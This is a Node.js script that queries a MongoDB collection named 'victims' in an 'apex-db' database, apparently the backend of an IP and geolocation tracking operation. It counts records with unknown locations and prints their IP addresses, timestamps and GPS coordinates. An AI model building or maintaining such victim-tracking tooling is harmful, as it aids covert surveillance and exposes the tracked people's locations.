const { MongoClient } = require('mongodb');
require('dotenv').config();

const uri = process.env.MONGODB_URI;
const client = new MongoClient(uri);

async function checkLocations() {
  try {
    await client.connect();
    const db = client.db('apex-db');
    const victims = await db.collection('victims').find({}).toArray();

    console.log(`Total victims: ${victims.length}`);

    const unknownLocations = victims.filter(v =>
      v.network?.city === 'Unknown' || v.network?.country === 'Unknown'
    );

    console.log(`Victims with Unknown location: ${unknownLocations.length}`);
    console.log(`Percentage: ${((unknownLocations.length / victims.length) * 100).toFixed(2)}%`);

    // Show sample
    if (unknownLocations.length > 0) {
      console.log('\nSample victims with Unknown location:');
      unknownLocations.slice(0, 3).forEach((sample, i) => {
        console.log(`\n${i+1}.`, {
          ip: sample.network?.ip,
          city: sample.network?.city,
          country: sample.network?.country,
          locationSource: sample.network?.locationSource,
          timestamp: sample.timestamp
        });
      });
    }

    // Check if there are GPS coordinates available
    const withGPS = unknownLocations.filter(v =>
      v.geolocation?.latitude && v.geolocation?.longitude
    );
    console.log(`\nVictims with Unknown location but GPS available: ${withGPS.length}`);

  } catch (error) {
    console.error('Error:', error);
  } finally {
    await client.close();
  }
}

checkLocations();
